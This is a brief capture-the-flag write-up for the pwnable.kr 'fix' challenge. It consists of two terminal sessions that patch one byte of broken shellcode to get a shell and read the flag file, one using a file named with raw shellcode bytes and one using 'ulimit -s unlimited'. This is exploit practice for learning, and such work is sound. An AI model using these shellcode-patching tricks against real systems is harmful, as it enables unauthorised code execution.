### my exploit
```
fix@ubuntu:~$ mkdir /tmp/exp_it
fix@ubuntu:~$ cd /tmp/exp_it
fix@ubuntu:/tmp/exp_it$ echo -e 'echo cat /home/fix/flag > \x83\xc4\x10\x83\xec\x0c\x50\xe8\x8d\x63\x01' | /bin/sh
fix@ubuntu:/tmp/exp_it$ /home/fix/fix
What the hell is wrong with my shellcode??????
I just copied and pasted it from shell-storm.org :(
Can you fix it for me?
Tell me the byte index to be fixed : 15
Tell me the value to be patched : 201
get shell
Sorry for blaming shell-strom.org :) it was my ignorance!
```

### awesome exploit form writeups section on pwnable.kr
```
fix@ubuntu:~$ ulimit -s unlimited
fix@ubuntu:~$ ./fix
What the hell is wrong with my shellcode??????
I just copied and pasted it from shell-storm.org :(
Can you fix it for me?
Tell me the byte index to be fixed : 15
Tell me the value to be patched : 92
get shell
$ cat flag
Sorry for blaming shell-strom.org :) it was my ignorance!
```
`ulimit -s unlimited` allows to use address `0x6e69622f ("/bin"?)` as proper stack address.
